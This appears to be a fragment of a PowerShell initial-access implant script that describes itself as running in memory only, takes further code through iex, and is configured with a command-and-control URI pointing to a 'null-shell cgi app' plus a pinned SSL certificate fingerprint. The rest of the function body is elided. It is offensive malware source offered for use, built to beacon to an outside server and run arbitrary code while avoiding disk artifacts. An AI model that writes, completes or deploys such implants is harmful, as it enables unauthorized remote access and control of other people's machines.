# inital-access-agent  
#
# In memory only implant any additional code can be added as a function
# to this script or done via iex etc... 
#

function main {

	$uri = 'https://192.168.1.28/' # Set ip address or domain hosting the null-shell cgi app.
	...
	$certfingerprint = 'C6F8F7C3D8A0924A5643415CC9135D1114473F04' # place your ssl key fingerprint here to perform manual key validation
